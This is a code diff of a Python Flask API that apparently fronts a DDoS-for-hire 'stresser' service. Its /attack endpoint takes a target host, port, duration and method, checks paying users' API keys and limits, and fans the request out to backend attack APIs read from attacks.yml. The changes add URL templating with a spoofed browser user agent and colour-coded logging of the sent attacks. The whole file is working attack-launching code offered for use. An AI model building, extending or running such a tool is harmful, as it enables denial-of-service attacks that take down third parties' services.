@@ -7,14 +7,21 @@ from urllib.parse import urlparse
 from flask import Flask, send_file, request, jsonify
 
 # Open the config file and read the contents
-with open('config.yml', 'r') as f:
+with open('attacks.yml', 'r') as f:
     config = yaml.safe_load(f)
 
+with open('settings.yml', 'r') as f:
+    settings = yaml.safe_load(f)
+
+blacklisted_domains=settings['config']['blacklist']
+apikeys=settings['config']['keys']
+maxtime=settings['config']['maxtime']
+
 # Read the settings.toml file
-config_toml = toml.load('settings.toml')
-blacklisted_domains = config_toml.get('config').get('blacklist')
-apikeys = config_toml.get('config').get('keys')
-maxtime = int(config_toml.get('config').get('maxtime'))
+#config_toml = toml.load('settings.toml')
+#blacklisted_domains = config_toml.get('config').get('blacklist')
+#apikeys = config_toml.get('config').get('keys')
+#maxtime = int(config_toml.get('config').get('maxtime'))
 
 # Get the list of methods from the config file
 methods = config['methods']
@@ -46,14 +53,14 @@ def attack():
     # If the host argument is not a valid IP address or URL, return an error
     if not (is_valid_ip or is_valid_url):
         return jsonify(
-            error="True",
+            error=True,
             message="Invalid host. Host must be a valid IP address or URL."
         ), 451
 
     for domain in blacklisted_domains:
         if domain in host:
             return jsonify(
-                error="True",
+                error=True,
                 message="Host is blacklisted."
             ), 451
 
@@ -63,17 +70,17 @@ def attack():
     method = request.args.get('method')
     if key not in apikeys:
         return jsonify(
-            error="True",
+            error=True,
             message="API Key Invalid."
         ), 451
     elif port > 65535:
         return jsonify(
-            error="True",
+            error=True,
             message="Invalid Port."
         ), 451
     elif duration > maxtime:
         return jsonify(
-            error="True",
+            error=True,
             message="Max Time Exceeded."
         ), 451
     else:
@@ -89,25 +96,34 @@ def attack():
 
             # Iterate over the list of URLs and send a request to each URL
             for url in urls:
-                requests.get(f"{url}?host={host}&time={duration}&port={port}&method={method}")
-
+                url = url.replace('<<host>>', host).replace('<<host>>', host).replace('<<port>>', str(port)).replace('<<time>>', str(duration))
+                ua = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
+                x = requests.get(url,headers = ua)
+                z = x.status_code
+                col = "\u001b[42m"
+                if z == 200:
+                    col = "\u001b[42m"
+                else:
+                    col = "\u001b[41m"
+                print(f"{col}{z}\u001b[0m - {url} - Request sent to API.")
             # Stop the timer
             end_time = time.perf_counter()
 
             # Compute the elapsed time
             elapsed_time = end_time - start_time
+            elapsed_time =str(elapsed_time).split(".",1)[0]
 
             return jsonify(
-                error="False",
+                error=False,
                 host=host,
                 port=port,
                 time=duration,
                 method=method,
-                elapsed=elapsed_time
+                elapsed=f'{elapsed_time},s'
             )
         else:
             return jsonify(
-                error="True",
+                error=True,
                 message="Method Not Found."
             ), 451
 
